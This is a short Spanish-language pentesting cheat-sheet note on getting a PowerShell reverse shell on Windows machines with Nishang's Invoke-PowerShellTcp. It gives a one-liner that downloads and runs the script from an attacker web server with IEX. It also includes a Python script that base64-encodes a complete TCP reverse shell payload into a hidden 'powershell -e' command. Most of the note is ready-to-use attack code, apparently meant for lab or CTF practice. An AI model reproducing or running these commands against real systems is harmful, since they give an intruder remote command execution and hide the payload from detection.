
## DESCRIPTION

La que considero la mejor reverse shell para ejecutar en una máquina Windows con Powershell es Invoke-Powershell de Nishang.

#### Mas información
* https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
* Kali:  /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1

## EXPLOITATION

1. Para que se ejecute directamente añadir el comando siguiente al final del script:

![[Pasted image 20230215114445.png]]

2. Para descargar el fichero desde la máquina: [[TRANSFERRING FILES]]

```
#Por ejemplo
cmd /c "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.10:8080/Invoke-PowerShellTcp.ps1')"
```

**!!NOTA IMPORTANTE!!** 
* Si en algunos casos no nos deja ejecutar script ps1 por algun motivos podemos probar a crear una shell ".exe" con msfvenom [[BUILD REVERSE SHELL MSFVENOM]]


## SCRIPT PARA CREAR REVERSE SHELL CODIFICADA

```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

![[Pasted image 20230526194151.png]]

![[Pasted image 20230526194212.png]]